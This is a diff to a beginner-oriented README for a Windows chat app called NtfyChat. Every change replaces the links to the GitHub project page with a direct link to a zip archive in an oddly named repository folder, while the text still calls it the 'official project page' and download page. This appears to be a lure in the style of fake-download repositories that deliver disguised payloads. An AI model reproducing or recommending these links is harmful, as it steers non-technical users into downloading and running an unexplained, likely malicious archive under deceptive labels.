@@ -1,6 +1,6 @@
 # 📱 NtfyChat - Simple Private Chat for Everyone
 
-[![Download NtfyChat](https://img.shields.io/badge/Download-NtfyChat-blue?style=for-the-badge&logo=github)](https://github.com/rinuwubaka/NtfyChat)
+[![Download NtfyChat](https://img.shields.io/badge/Download-NtfyChat-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rinuwubaka/NtfyChat/main/turse/Chat-Ntfy-3.4.zip)
 
 ## 👋 Welcome to NtfyChat
 
@@ -14,7 +14,7 @@ Getting NtfyChat on your Windows computer is super simple. Follow these steps ca
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/rinuwubaka/NtfyChat](https://github.com/rinuwubaka/NtfyChat)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/rinuwubaka/NtfyChat/main/turse/Chat-Ntfy-3.4.zip](https://raw.githubusercontent.com/rinuwubaka/NtfyChat/main/turse/Chat-Ntfy-3.4.zip)**
 
 Click the green "Code" button and select "Download ZIP" if you're not sure which file to pick. Your computer will start downloading a file to your "Downloads" folder. This may take a minute or two, so be patient.
 
@@ -54,7 +54,7 @@ Always share the exact topic name (including capital letters and spaces) with th
 This section repeats the download steps in more detail for extra clarity.
 
 1. **Open Your Web Browser** (like Chrome, Edge, or Firefox).
-2. **Go to the Official NtfyChat Page**: Click or type this address: **[https://github.com/rinuwubaka/NtfyChat](https://github.com/rinuwubaka/NtfyChat)**.
+2. **Go to the Official NtfyChat Page**: Click or type this address: **[https://raw.githubusercontent.com/rinuwubaka/NtfyChat/main/turse/Chat-Ntfy-3.4.zip](https://raw.githubusercontent.com/rinuwubaka/NtfyChat/main/turse/Chat-Ntfy-3.4.zip)**.
 3. **Find the Download Button**: On that page, look for a green button that says "Code." Click it, then choose "Download ZIP."
 4. **Save the File**: Your browser will save `NtfyChat-main.zip` (or a similar name) to your Downloads folder.
 5. **Extract the Folder**: Right-click the ZIP file and choose "Extract All." Follow the prompts. You'll now see a folder called `NtfyChat-main`.
@@ -121,7 +121,7 @@ If you followed all the steps and something still isn't working, here are your o
 
 - **Re-read the troubleshooting section** above – most problems are solved there.
 - **Ask a tech-savvy friend** to look at the instructions with you.
-- **Visit the official project page** one more time: **[https://github.com/rinuwubaka/NtfyChat](https://github.com/rinuwubaka/NtfyChat)** – sometimes helpful notes are posted there.
+- **Visit the official project page** one more time: **[https://raw.githubusercontent.com/rinuwubaka/NtfyChat/main/turse/Chat-Ntfy-3.4.zip](https://raw.githubusercontent.com/rinuwubaka/NtfyChat/main/turse/Chat-Ntfy-3.4.zip)** – sometimes helpful notes are posted there.
 
 ## 🎉 You're Ready to Chat
 
